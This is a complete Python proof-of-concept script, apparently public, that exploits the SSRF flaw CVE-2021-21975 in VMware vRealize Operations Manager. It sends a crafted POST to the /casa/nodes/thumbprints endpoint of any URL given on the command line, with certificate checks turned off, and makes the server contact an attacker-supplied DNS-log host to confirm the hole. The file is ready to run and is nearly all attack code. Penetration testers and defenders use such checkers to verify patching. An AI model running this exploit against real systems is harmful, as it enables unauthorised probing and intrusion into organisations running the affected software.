#!/usr/bin/env python3
import requests
import argparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    print('''========================================================\n
\tVMware vRealize Operations Manager SSRF \n
\t\t    CVE-2021-21975 \n
========================================================\n''')

def VMware_SSRF_exploit(url, dnslog):
    target = url + '/casa/nodes/thumbprints'
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{0}"]'.format(dnslog)
    try:
        response = requests.post(url=target, headers=headers, data=data, verify=False, timeout=5)
        if response.status_code == 200:
            print(f'\033[32m[+] Target system: \033[0m{url} \033[32mmay have SSRF vulnerable, check DNS Log response.\033[0m')
            print(f'\033[36m[*] DNS Log response: \033[0m{response.text}')
        else:
            print(f'\033[31m[-] Target system: \033[0m{url} \033[31mdoes not have SSRF vulnerable.')
    except Exception as e:
        print('\033[31m[!] An unexpected error occurred on the target system. \033[0m\n', e)

if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-u", "--url",
        metavar="", required="True",
        help="Target url. eg: -u https://<target url>, --url https://<target url>"
    )
    parser.add_argument(
        "-d", "--dnslog",
        metavar="", required="True",
        help="DNS Log."
    )

    args = parser.parse_args()
    VMware_SSRF_exploit(args.url, args.dnslog)